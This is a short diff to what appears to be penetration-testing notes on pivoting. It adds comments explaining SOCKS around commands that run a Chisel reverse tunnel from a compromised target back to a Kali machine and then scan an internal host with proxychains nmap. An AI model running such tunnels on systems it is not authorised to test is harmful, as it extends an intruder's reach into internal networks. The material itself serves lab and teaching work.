@@ -27,6 +27,8 @@ chisel server -p 8000 --reverse
 # On the compromised target, run the client, connecting back to Kali and opening a reverse SOCKS proxy
 ./chisel client <kali_ip>:8000 R:socks
 
+# SOCKS (Socket Secure) is a protocol that lets you route any TCP/UDP traffic through a proxy server;
+# once Chisel opens a SOCKS listener, proxychains forwards your tools' connections through it
 # Now route tools through the tunnel via proxychains, pointed at Chisel's local SOCKS listener (default 127.0.0.1:1080)
 proxychains nmap -sT -Pn <internal_target>
 ```
